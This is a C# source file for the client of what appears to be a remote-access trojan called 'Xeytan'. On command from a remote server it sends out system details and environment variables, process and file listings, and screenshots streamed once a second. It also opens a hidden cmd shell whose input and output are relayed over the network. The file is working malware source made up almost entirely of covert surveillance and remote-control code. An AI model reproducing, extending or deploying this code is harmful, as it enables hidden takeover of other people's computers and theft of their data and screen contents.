using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using NetLib.Models;
using NetLib.Packets;
using XeytanCSharpClient.Net;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpClient
{
    class XeytanApplication
    {
        private Process _process;
        public bool ShellActive { get; set; } = false;
        private byte[] BufferOut { get; set; } = new byte[1024];
        private byte[] BufferErr { get; set; } = new byte[1024];
        public ReaderWriterLock ShellActiveLock { get; set; } = new ReaderWriterLock();
        public bool IsStreamingDesktop { get; set; } = false;


        public void Start()
        {
            NetClientService = new NetClientService
            {
                Application = this
            };

            NetClientService.Start();
        }

        public NetClientService NetClientService { get; set; }

        public void OnSystemInformationRequested()
        {
            string pcName = Environment.MachineName;
            string userName = Environment.UserName;
            string osVersion = Environment.OSVersion.ToString();
            string dotNetVersion = Environment.Version.ToString();
            // System.Environment.Version.ToString()
            IDictionary envVariables = Environment.GetEnvironmentVariables();

            NetClientService.SendSystemInformation(new SystemInfo
            {
                PcName = pcName, UserName = userName, OperatingSystem = osVersion, DotNetVersion = dotNetVersion,
                EnvironmentVariables = envVariables
            });
        }

        public void OnProcessListRequested()
        {
            Process[] processes = Process.GetProcesses();
            List<NetLib.Models.ProcessInfo> processInfos = new List<NetLib.Models.ProcessInfo>();

            foreach (Process process in processes)
            {
                string processName = process.ProcessName;
                int pid = process.Id;
                ProcessInfo processInfo = new ProcessInfo {ProcessName = processName, Pid = pid};
                processInfos.Add(processInfo);

                try
                {
                    processInfo.FilePath = process.MainModule.FileName;
                }
                catch (Win32Exception exception)
                {
                    // Console.WriteLine(exception.ToString());
                    Console.WriteLine("Error with process {0} ({1})", processName, pid);
                }
                catch (InvalidOperationException exception)
                {
                    Console.WriteLine("Error with process {0} ({1})", processName, pid);
                }
            }

            NetClientService.SendProcessList(processInfos);
        }

        public void OnRootsRequested()
        {
            // Send Roots
            DriveInfo[] drives = DriveInfo.GetDrives();
            List<DiskDriveInfo> diskDrives = new List<DiskDriveInfo>();
            foreach (DriveInfo driveInfo in drives)
            {
                diskDrives.Add(new DiskDriveInfo
                {
                    Name = driveInfo.Name,
                    DriveFormat = driveInfo.DriveFormat,
                    Label = driveInfo.VolumeLabel
                });
            }

            NetClientService.SendFileSystemRoots(diskDrives);
        }

        public void OnListDirRequested(string path)
        {
            try
            {
                FileAttributes attributes = File.GetAttributes(path);
                List<NetLib.Models.FileInfo> files = new List<FileInfo>();
                if ((attributes & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    string[] dirEntries = Directory.GetFileSystemEntries(path);

                    foreach (string dirEntry in dirEntries)
                    {
                        try
                        {
                            FileAttributes entryAttributes = File.GetAttributes(dirEntry);
                            long fileSize;
                            if (!entryAttributes.HasFlag(FileAttributes.Directory))
                            {
                                fileSize = new System.IO.FileInfo(dirEntry).Length;
                            }
                            else
                            {
                                fileSize = 0;
                            }

                            files.Add(new FileInfo
                            {
                                FilePath = dirEntry,
                                FileSize = fileSize,
                                FileAttributes = entryAttributes,
                                CreationTime = File.GetCreationTimeUtc(dirEntry),
                                LastAccessTime = File.GetLastAccessTimeUtc(dirEntry),
                                LastWriteTime = File.GetLastWriteTimeUtc(dirEntry),
                            });
                        }
                        catch (FileNotFoundException exception)
                        {
                            Debug.WriteLine("Error trying to retrieve info on {0}\n{1}",
                                path, exception.ToString());
                        }
                    }

                    NetClientService.SendFileSystemEntries(path, files);
                }
                else
                {
                    Debug.WriteLine("{0} Is not a directory");
                }
            }
            catch (Exception exception)
            {
                Debug.WriteLine("Error trying to retrieve attributes on {0}\n{1}",
                    path, exception.ToString());
            }
        }

        public void OnShellRequested(ShellAction shellAction, string command)
        {
            try
            {
                ShellActiveLock.AcquireReaderLock(15 * 1000);

                if (shellAction == ShellAction.Start && !ShellActive)
                {
                    try
                    {
                        ShellActiveLock.UpgradeToWriterLock(15 * 1000);
                        ShellActive = true;
                    }
                    catch (ApplicationException)
                    {
                    }
                    finally
                    {
                        ShellActiveLock.ReleaseWriterLock();
                    }

                    StartShell();
                }
                else if (shellAction == ShellAction.Push && ShellActive)
                {
                    PipeToProcess(command);
                }
                else if (shellAction == ShellAction.Stop && ShellActive)
                {
                    ShellActiveLock.ReleaseReaderLock();
                    StopShell();
                }
            }
            catch (ApplicationException)
            {
            }
            finally
            {
                // if shellAction == Stop, then we released the lock already
                if (ShellActiveLock.IsReaderLockHeld)
                    ShellActiveLock.ReleaseReaderLock();
            }
        }

        private void StopShell()
        {
            try
            {
                ShellActiveLock.AcquireWriterLock(15 * 1000);

                if (ShellActive)
                {
                    ShellActive = false;
                    ShellActiveLock.ReleaseWriterLock();
                    _process.Close();
                    NetClientService.SendShellStop();
                }
            }
            catch (ApplicationException)
            {
                Console.WriteLine("DeadLock?? ");
            }
            finally
            {
                if (ShellActiveLock.IsWriterLockHeld)
                    ShellActiveLock.ReleaseWriterLock();
            }
        }

        private void PipeToProcess(string command)
        {
            if (command.EndsWith("\n"))
                _process.StandardInput.Write(command);
            else
                _process.StandardInput.WriteLine(command);
        }


        private void StartShell()
        {
            _process = new Process();
            _process.StartInfo.FileName = "cmd";
            _process.StartInfo.Arguments = "";
            _process.StartInfo.CreateNoWindow = true;
            _process.StartInfo.UseShellExecute = false;
            _process.StartInfo.RedirectStandardOutput = true;
            _process.StartInfo.RedirectStandardInput = true;
            _process.StartInfo.RedirectStandardError = true;

            _process.Start();

            _process.StandardOutput.BaseStream.BeginRead(BufferOut,
                0, BufferOut.Length,
                OnOutputAvailable, _process.StandardOutput);

            _process.StandardError.BaseStream.BeginRead(BufferErr,
                0, BufferErr.Length,
                OnErrorAvailable, _process.StandardError);
        }

        private void OnOutputAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                if (processStream != null)
                {
                    int numberOfBytesRead = processStream.BaseStream.EndRead(ar);

                    if (numberOfBytesRead == 0)
                    {
                        StopShell();
                        return;
                    }

                    string output = Encoding.UTF8.GetString(BufferOut, 0, numberOfBytesRead);
                    Console.Write(output);
                    Console.Out.Flush();

                    processStream.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable,
                        processStream);

                    NetClientService.SendShellOutput(output);
                }
            }
        }

        private void OnErrorAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                if (processStream != null)
                {
                    int numberOfBytesRead = processStream.BaseStream.EndRead(ar);


                    if (numberOfBytesRead == 0)
                    {
                        StopShell();
                        return;
                    }

                    string output = Encoding.UTF8.GetString(BufferErr, 0, numberOfBytesRead);
                    Console.Write(output);
                    Console.Out.Flush();

                    processStream.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable, processStream);

                    NetClientService.SendShellOutput(output);
                }
            }
        }

        public static Bitmap CaptureScreenShot()
        {
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            return CaptureScreenShot(x, y, width, height);
        }

        private static Bitmap CaptureScreenShot(int x, int y, int width, int height)
        {
            Bitmap screenShotBmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);

            Graphics screenShotGraphics = Graphics.FromImage(screenShotBmp);

            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height),
                CopyPixelOperation.SourceCopy);
            screenShotGraphics.Dispose();

            return screenShotBmp;
        }

        public void OnDesktopRequest(DesktopAction action)
        {
            if (action == DesktopAction.Start && !IsStreamingDesktop)
            {
                new Thread(this.StreamDesktop).Start();
            }
            else if (action == DesktopAction.Stop && IsStreamingDesktop)
            {
                IsStreamingDesktop = false;
            }
        }

        public void StreamDesktop()
        {
            IsStreamingDesktop = true;
            while (IsStreamingDesktop)
            {
                byte[] imageData = Bitmap2ByteArray(CaptureScreenShot());

                NetClientService.SendDesktopImage(imageData);

                Thread.Sleep(1000);
            }
        }

        public byte[] Bitmap2ByteArray(Bitmap bitmap)
        {
            MemoryStream memoryStream = new MemoryStream();

            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            // captureBitmap.Save(memoryStream, captureBitmap.RawFormat);

            return memoryStream.ToArray();
        }
    }
}